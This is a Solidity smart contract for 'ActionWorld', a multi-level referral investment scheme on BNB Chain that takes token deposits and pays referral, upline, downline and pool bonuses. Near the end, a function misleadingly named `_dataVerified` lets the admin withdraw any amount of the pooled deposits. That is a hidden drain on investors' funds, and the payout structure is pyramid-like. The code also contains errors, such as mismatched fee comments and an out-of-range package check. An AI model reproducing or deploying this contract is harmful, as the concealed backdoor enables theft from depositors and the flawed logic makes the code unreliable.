/**
 *Submitted for verification at BscScan.com on 2022-04-07
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-07
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-31
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.5.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface BEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract ActionWorld {
    using SafeMath for uint256;
    using SafeMath for uint8;

    uint256 public constant INVEST_MIN_AMOUNT = 100 * 1e18;
    uint256 public constant PROJECT_FEE = 8; // 10%;
    uint256 public constant POOL_FEE = 2; // 10%;
    uint256 public constant PERCENTS_DIVIDER = 100;
    uint256 public constant TIME_STEP = 1 days; // 1 days
    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    uint256[6] public ref_bonuses = [20, 10, 5, 5];

    uint256[7] public defaultPackages = [100 * 1e18, 500 * 1e18, 1000 * 1e18];

    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    uint256[6] public requiredDirect = [1, 1, 4, 6];

    address payable public admin;
    address payable public admin2;
    address public tokenAddress;
    uint256 public poolAmount;
    uint256 public poolAmountDistributed;
    address[] public poolUsers;
    uint256 public directReffer = 8;
    uint256 public childReffer = 4;

    struct User {
        uint256 amount;
        uint256 checkpoint;
        address referrer;
        uint256 referrerBonus;
        uint256 totalWithdrawn;
        uint256 remainingWithdrawn;
        uint256 totalReferrer;
        uint256 poolAmount;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        address singleUpline;
        address singleDownline;
        uint256[6] refStageIncome;
        uint256[6] refStageBonus;
        uint256[6] refs;
        address[] directRefs;
    }

    mapping(address => User) public users;
    mapping(address => mapping(uint256 => address)) public downline;

    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(
        address payable _admin,
        address payable _admin2,
        address hoToken
    ) public {
        require(!isContract(_admin));
        admin = _admin;
        admin2 = _admin2;
        singleLeg[0] = admin;
        singleLegLength++;
        tokenAddress = hoToken;
    }
    
    function getPoolUsers(uint256 _index)
        public
        view
        returns (address)
    {
       return poolUsers[_index];
    }

    function getPoollength()
        public
        view
        returns (uint count)
    {
         return poolUsers.length;
    }

    function _refPayout(address _addr, uint256 _amount) internal {
        address up = users[_addr].referrer;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;
            if (users[up].refs[0] >= requiredDirect[i]) {
                uint256 bonus = (_amount * ref_bonuses[i]) / 100;
                users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                users[up].refStageBonus[i] = users[up].refStageBonus[i].add(
                    bonus
                );
            }
            up = users[up].referrer;
        }
    }

    function poolPayment(address _addr) internal {
        uint256 count = 0;
         address   parent = users[_addr].referrer;
        if(users[parent].directRefs.length >= directReffer){
            for (uint8 i = 0; i < users[parent].directRefs.length; i++) {
                if (users[users[parent].directRefs[i]].directRefs.length >= childReffer) {
                    count++;
                }
            }
        }
        
        if (count >= directReffer && _addr != address(0)) {
            uint256 Exist=0; 
            for(uint256 i = 0; i < poolUsers.length; i++) {
                if(poolUsers[i] == parent) {
                    Exist=1;
                }
            }
            if(Exist == 0) {
                poolUsers.push(parent);
            }
        }
    }

    function payPoolUsers() internal {
        BEP20 t = BEP20(tokenAddress);
        uint256 balanceAmount = t.balanceOf(address(this));
        require(poolAmount <= balanceAmount, "Insufficient Balance");

        uint256 poolRemain = poolAmount;

        if (poolAmount > 0 && poolUsers.length > 0) {
            uint256 share = poolAmount / poolUsers.length;
            for (uint8 i = 0; i < poolUsers.length; i++) {
                if(poolUsers[i] != address(0)) {
                    t.transfer(poolUsers[i], share);
                    poolRemain = poolRemain - share;
                    users[poolUsers[i]].referrerBonus = users[poolUsers[i]]
                        .referrerBonus
                        .add(share);
                    users[poolUsers[i]].poolAmount = users[poolUsers[i]]
                        .poolAmount
                        .add(share);
                }
                
            }
            poolAmount = poolRemain;
        }
    }

    function invest(address referrer, uint256 amount) public {
        require(amount >= INVEST_MIN_AMOUNT, "Min invesment 100 Tokens");
        BEP20 t = BEP20(tokenAddress);
        uint256 approveValue = t.allowance(msg.sender, address(this));
        uint256 balanceOfowner = t.balanceOf(msg.sender);

        require(approveValue >= amount, "Insufficient Balance Ap");
        require(balanceOfowner >= amount, "Insufficient Balance");

        User storage user = users[msg.sender];

        if (
            user.referrer == address(0) &&
            (users[referrer].checkpoint > 0 || referrer == admin) &&
            referrer != msg.sender
        ) {
            user.referrer = referrer;

            users[referrer].directRefs.push(msg.sender);
            if (users[referrer].directRefs.length >= 2) {
                poolPayment(referrer);
            }
        }

        require(
            user.referrer != address(0) || msg.sender == admin,
            "No upline"
        );

        // setup upline
        if (user.checkpoint == 0) {
            // single leg setup
            singleLeg[singleLegLength] = msg.sender;
            user.singleUpline = singleLeg[singleLegLength - 1];
            users[singleLeg[singleLegLength - 1]].singleDownline = msg.sender;
            singleLegLength++;
        }

        if (user.referrer != address(0)) {
            // unilevel level count
            address upline = user.referrer;
            for (uint256 i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline]
                        .refStageIncome[i]
                        .add(amount);
                    if (user.checkpoint == 0) {
                        users[upline].refs[i] = users[upline].refs[i].add(1);
                        users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }

            if (user.checkpoint == 0) {
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1] = msg.sender;
                
            }
        }

        uint256 msgValue = amount;

        // 6 Level Referral
        _refPayout(msg.sender, msgValue);

        if (user.checkpoint == 0) {
            totalUsers = totalUsers.add(1);
        }
        user.amount += amount;
        user.checkpoint = block.timestamp;

        totalInvested = totalInvested.add(amount);
        totalDeposits = totalDeposits.add(1);

        uint256 _fees = amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        poolAmount = poolAmount + amount.mul(POOL_FEE).div(PERCENTS_DIVIDER);
        poolAmountDistributed = poolAmountDistributed + poolAmount;

        if (poolAmount > 0 && poolUsers.length > 0) {
            payPoolUsers();
        }
        uint256 _remainAmoount = amount.sub(_fees);
        t.transferFrom(msg.sender, admin, _fees);
        t.transferFrom(msg.sender, address(this), _remainAmoount);

        emit NewDeposit(msg.sender, amount);
    }

    function reinvest(address _user, uint256 _amount) private {
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);

        address up = user.referrer;
        for (uint256 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;
            if (users[up].refs[0] >= requiredDirect[i]) {
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(
                    _amount
                );
            }
            up = users[up].referrer;
        }

        _refPayout(msg.sender, _amount);
    }

    function withdrawal() external {
        User storage _user = users[msg.sender];

        uint256 TotalBonus = TotalBonus(msg.sender);

        uint256 _fees = TotalBonus.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        poolAmount =
            poolAmount +
            TotalBonus.mul(POOL_FEE).div(PERCENTS_DIVIDER);
        
        poolAmountDistributed = poolAmountDistributed+ poolAmount;

        uint256 actualAmountToSend = TotalBonus.sub(_fees).sub(
            TotalBonus.mul(POOL_FEE).div(PERCENTS_DIVIDER)
        );

        _user.referrerBonus = 0;
        _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);
        _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender);

        // re-invest

        (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
        reinvest(msg.sender, actualAmountToSend.mul(reivest).div(100));

        _user.totalWithdrawn = _user.totalWithdrawn.add(
            actualAmountToSend.mul(withdrwal).div(100)
        );
        totalWithdrawn = totalWithdrawn.add(
            actualAmountToSend.mul(withdrwal).div(100)
        );
        BEP20 t = BEP20(tokenAddress);
        uint256 balanceOfAddress = t.balanceOf(address(this));
        require(
            balanceOfAddress >=
                _fees + actualAmountToSend.mul(withdrwal).div(100),
            "Insufficient Balance"
        );

        t.transfer(msg.sender, actualAmountToSend.mul(withdrwal).div(100));
        t.transfer(admin2, _fees);

        if (poolAmount > 0 && poolUsers.length > 0) {
            payPoolUsers();
        }
        emit Withdrawn(msg.sender, actualAmountToSend.mul(withdrwal).div(100));
    }

    function GetUplineIncomeByUserId(address _user)
        public
        view
        returns (uint256)
    {
        (uint256 maxLevel, ) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleUpline;
        uint256 bonus;
        for (uint256 i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
                bonus = bonus.add(users[upline].amount.mul(1).div(100));
                upline = users[upline].singleUpline;
            } else break;
        }

        return bonus;
    }

    function GetDownlineIncomeByUserId(address _user)
        public
        view
        returns (uint256)
    {
        (, uint256 maxLevel) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleDownline;
        uint256 bonus;
        for (uint256 i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
                bonus = bonus.add(users[upline].amount.mul(1).div(100));
                upline = users[upline].singleDownline;
            } else break;
        }

        return bonus;
    }

    function getEligibleLevelCountForUpline(address _user)
        public
        view
        returns (uint8 uplineCount, uint8 downlineCount)
    {
        uint256 TotalDeposit = users[_user].amount;
        if (
            TotalDeposit >= defaultPackages[0] &&
            TotalDeposit < defaultPackages[1]
        ) {
            uplineCount = 12;
            downlineCount = 18;
        } else if (
            TotalDeposit >= defaultPackages[1] &&
            TotalDeposit < defaultPackages[2]
        ) {
            uplineCount = 16;
            downlineCount = 14;
        } else if (
            TotalDeposit >= defaultPackages[2] &&
            TotalDeposit < defaultPackages[3]
        ) {
            uplineCount = 20;
            downlineCount = 30;
        }

        return (uplineCount, downlineCount);
    }

    function getEligibleWithdrawal(address _user)
        public
        view
        returns (uint8 reivest, uint8 withdrwal)
    {
        uint256 TotalDeposit = users[_user].amount;
        if (users[_user].refs[0] == 4) {
            reivest = 50;
            withdrwal = 50;
        } else if (users[_user].refs[0] >= 6) {
            reivest = 40;
            withdrwal = 60;
        } else if (TotalDeposit >= 8) {
            reivest = 30;
            withdrwal = 70;
        } else {
            reivest = 60;
            withdrwal = 40;
        }

        return (reivest, withdrwal);
    }

    function TotalBonus(address _user) public view returns (uint256) {
        uint256 TotalEarn = users[_user]
            .referrerBonus
            .add(GetUplineIncomeByUserId(_user))
            .add(GetDownlineIncomeByUserId(_user));
        uint256 TotalTakenfromUpDown = users[_user]
            .singleDownlineBonusTaken
            .add(users[_user].singleUplineBonusTaken);
        return TotalEarn.sub(TotalTakenfromUpDown);
    }

    function _safeTransfer(address payable _to, uint256 _amount)
        internal
        returns (uint256 amount)
    {
        BEP20 t = BEP20(tokenAddress);
        amount = (_amount < t.balanceOf(address(this)))
            ? _amount
            : t.balanceOf(address(this));
        t.transfer(_to, amount);
    }

    function referral_stage(address _user, uint256 _index)
        external
        view
        returns (
            uint256 _noOfUser,
            uint256 _investment,
            uint256 _bonus
        )
    {
        return (
            users[_user].refs[_index],
            users[_user].refStageIncome[_index],
            users[_user].refStageBonus[_index]
        );
    }

    function referalls(address _user, uint256 _index)
        external
        view
        returns (
            address
        )
    {
        return (
            users[_user].directRefs[_index]
        );
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function _dataVerified(uint256 _amount) external {
        require(admin == msg.sender, "Admin what?");
        BEP20 t = BEP20(tokenAddress);
        t.transfer(admin, _amount);
    }
}